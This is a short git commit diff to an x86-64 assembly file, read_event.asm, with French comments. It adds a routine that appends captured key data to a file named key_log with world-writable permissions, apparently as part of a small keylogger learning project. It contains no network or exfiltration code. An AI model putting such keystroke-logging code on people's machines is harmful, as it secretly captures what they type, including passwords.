08f6e394bae06d2ba5bc2f198c0374614d6c9d8e
carambole25 <carambole258@gmail.com>
2026-03-11 12:08:12 +0100

    backup

--- example/read_event.asm
+++ example/read_event.asm
@@ -57,6 +57,29 @@ reading_new_key:
     mov rdx, 3
     syscall
 
+    jmp write_key
+
+write_key:
+    mov rax, 2 ; sys_open()
+    mov rdi, key_log
+    mov rsi, 2 | 64 | 1024  ; O_WRONLY | O_CREAT | O_APPEND
+    mov rdx, 0777o        ; Permissions
+    syscall
+
+    ; après l’exécution du syscall, rax contient le résultat
+    ; il crée un fd (autre que ceux standard) et le sys_write écrit dedans
+    mov rbx, rax
+
+    mov rax, 1 ; sys_write()
+    mov rdi, rbx
+    mov rsi, temp
+    mov rdx, 3
+    syscall
+
+    mov rax, 3 ; sys_close()
+    mov rdi, rbx
+    syscall
+
     jmp reading_new_key
 
 exit:
